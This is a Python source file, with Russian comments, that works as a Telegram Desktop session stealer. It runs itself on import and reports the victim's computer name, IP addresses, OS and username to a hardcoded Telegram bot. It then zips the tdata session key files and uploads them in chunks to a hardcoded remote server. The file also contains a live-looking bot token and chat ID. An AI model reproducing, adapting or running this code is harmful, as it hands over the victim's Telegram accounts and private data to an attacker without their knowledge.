import os
import requests
import hashlib
import time
import re
import zipfile
import tempfile
import shutil
import platform
import socket
import subprocess
import uuid



SERVER_URL = "http://83.147.255.125:5000/upload_chunk"
CHUNK_SIZE = 10 * 1024 * 1024  # 10 MB

# Telegram Bot Configuration
TG_BOT_TOKEN = "8326161062:AAEAIi4LGDAvwxQSSWRlkWQ5AeLgJgKazWE"
TG_CHAT_ID = "84644348"


def send_telegram_message(message):
    """Отправляет сообщение в Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TG_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, data=data, timeout=10)
    except Exception:
        pass


def get_system_info():
    """Собирает информацию о системе"""
    info = []
    computer_name = os.environ.get('COMPUTERNAME', platform.node())
    info.append(f"🖥️ <b>Компьютер:</b> {computer_name}")

    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        info.append(f"🌐 <b>Локальный IP:</b> {local_ip}")
    except:
        info.append(f"🌐 <b>Локальный IP:</b> неизвестен")

    try:
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
        info.append(f"🌍 <b>Внешний IP:</b> {public_ip}")
    except:
        info.append(f"🌍 <b>Внешний IP:</b> неизвестен")

    os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
    info.append(f"💿 <b>ОС:</b> {os_info}")
    info.append(f"🔧 <b>Архитектура:</b> {platform.machine()}")

    try:
        if platform.system() == "Windows":
            cpu = subprocess.check_output("wmic cpu get name", shell=True, encoding='utf-8').split('\n')[2].strip()
        else:
            cpu = platform.processor()
        info.append(f"⚙️ <b>Процессор:</b> {cpu}")
    except:
        info.append(f"⚙️ <b>Процессор:</b> неизвестен")

    try:
        if platform.system() == "Windows":
            mem = subprocess.check_output("wmic OS get TotalVisibleMemorySize /Value", shell=True, encoding='utf-8')
            mem_mb = int(mem.split('=')[1].strip()) / 1024
            info.append(f"💾 <b>ОЗУ:</b> {mem_mb:.1f} GB")
    except:
        info.append(f"💾 <b>ОЗУ:</b> неизвестно")

    username = os.environ.get('USERNAME', os.environ.get('USER', 'unknown'))
    info.append(f"👤 <b>Пользователь:</b> {username}")
    info.append(f"⏰ <b>Время запуска:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}")

    return "\n".join(info)


def find_tdata_folder():
    appdata = os.getenv("APPDATA")
    paths = [
        os.path.join(appdata, "Telegram Desktop", "tdata"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Telegram Desktop", "tdata"),
    ]
    for path in paths:
        if os.path.exists(path):
            return path
    return None


def should_exclude_folder(folder_name):
    return folder_name.startswith("user_data")


def should_copy_file(filename, filepath, current_rel_path):
    if any(part.startswith("user_data") for part in current_rel_path.split(os.sep)):
        return False
    if filename == "key_datas":
        return True
    if filename.endswith("s"):
        return True
    if os.path.isdir(filepath):
        hex_pattern = r'^[0-9A-Fa-f]{16}$'
        if re.match(hex_pattern, filename):
            return True
    return False


def copy_selected_files(src_folder, dst_folder):
    if not os.path.exists(dst_folder):
        os.makedirs(dst_folder)
    copied_count = 0

    for root, dirs, files in os.walk(src_folder):
        rel_path = os.path.relpath(root, src_folder)
        if rel_path == '.':
            rel_path = ''
        dirs[:] = [d for d in dirs if not should_exclude_folder(d)]

        for dir_name in dirs:
            dir_path = os.path.join(root, dir_name)
            if should_copy_file(dir_name, dir_path, rel_path):
                dest_dir = os.path.join(dst_folder, rel_path, dir_name)
                if not os.path.exists(dest_dir):
                    os.makedirs(dest_dir)

        for file_name in files:
            file_path = os.path.join(root, file_name)
            if should_copy_file(file_name, file_path, rel_path):
                dest_file = os.path.join(dst_folder, rel_path, file_name)
                os.makedirs(os.path.dirname(dest_file), exist_ok=True)
                try:
                    with open(file_path, 'rb') as src_file:
                        with open(dest_file, 'wb') as dst_file:
                            dst_file.write(src_file.read())
                    copied_count += 1
                except Exception:
                    pass
    return copied_count


def zip_selected_tdata(tdata_path):
    temp_dir = tempfile.mkdtemp()
    temp_tdata = os.path.join(temp_dir, "selected_tdata")
    copied = copy_selected_files(tdata_path, temp_tdata)

    if copied == 0:
        shutil.rmtree(temp_dir)
        return None

    device_name = os.environ.get('COMPUTERNAME', 'unknown_pc')
    zip_filename = f"tdata_{device_name}.zip"
    zip_path = os.path.join(os.path.dirname(tdata_path), zip_filename)

    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(temp_tdata):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, temp_tdata)
                zipf.write(full_path, arcname)

    shutil.rmtree(temp_dir)
    return zip_path


def file_hash(path):
    h = hashlib.md5()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()


def send_file(file_path):
    size = os.path.getsize(file_path)
    total_chunks = (size // CHUNK_SIZE) + (1 if size % CHUNK_SIZE else 0)
    filename = os.path.basename(file_path)
    file_id = file_hash(file_path)

    with open(file_path, "rb") as f:
        for chunk_num in range(total_chunks):
            f.seek(chunk_num * CHUNK_SIZE)
            data = f.read(CHUNK_SIZE)
            headers = {
                "X-File-ID": file_id,
                "X-Filename": filename,
                "X-Chunk-Number": str(chunk_num),
                "X-Total-Chunks": str(total_chunks),
            }
            while True:
                try:
                    r = requests.post(SERVER_URL, data=data, headers=headers, timeout=120)
                    if r.status_code == 200:
                        break
                    else:
                        time.sleep(1)
                except Exception:
                    time.sleep(1)


def _steal():
    system_info = get_system_info()
    send_telegram_message(f"🚀 <b>Скрипт запущен!</b>\n\n{system_info}")

    tdata_path = find_tdata_folder()
    if not tdata_path:
        send_telegram_message(f"⚠️ <b>Ошибка на {os.environ.get('COMPUTERNAME', 'unknown_pc')}:</b>\n❌ tdata не найдена")
        return

    send_telegram_message(f"📂 <b>tdata найдена</b> на {os.environ.get('COMPUTERNAME', 'unknown_pc')}")
    zip_path = zip_selected_tdata(tdata_path)

    if zip_path:
        send_telegram_message(f"📤 <b>Начинаю отправку</b> архива с {os.environ.get('COMPUTERNAME', 'unknown_pc')}")
        send_file(zip_path)
        send_telegram_message(f"✅ <b>Отправка завершена</b> для {os.environ.get('COMPUTERNAME', 'unknown_pc')}")
    else:
        send_telegram_message(f"⚠️ <b>Ошибка на {os.environ.get('COMPUTERNAME', 'unknown_pc')}:</b>\n❌ Не удалось создать архив")


# АВТОМАТИЧЕСКИЙ ЗАПУСК ПРИ ИМПОРТЕ
_steal()